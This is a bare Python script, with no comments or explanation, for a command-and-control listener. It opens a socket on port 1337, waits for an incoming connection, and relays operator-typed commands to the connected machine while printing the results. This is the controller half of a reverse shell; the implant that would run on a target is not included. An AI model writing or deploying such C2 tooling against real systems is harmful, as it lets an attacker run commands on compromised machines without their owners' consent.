import socket

host = "127.0.0.1"
port = 1337

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c2:
    c2.bind((host,port))
    c2.listen(1)
    remote_socket, remote_addr = c2.accept()
    remote_ip_addr, remote_port = remote_addr
    print(f"connection from: {remote_ip_addr}:{remote_port}")
    while remote_socket:
        data = remote_socket.recv(1024)
        client_prompt = data.decode("utf-8").strip("\n")
        command = input(client_prompt)
        remote_socket.send(command.encode())
        command_out = remote_socket.recv(1024)
        print(command_out.decode("utf-8").strip("\n"))
        if command_out.decode("utf-8").strip("\n") == "exit":
            break
    print("end...")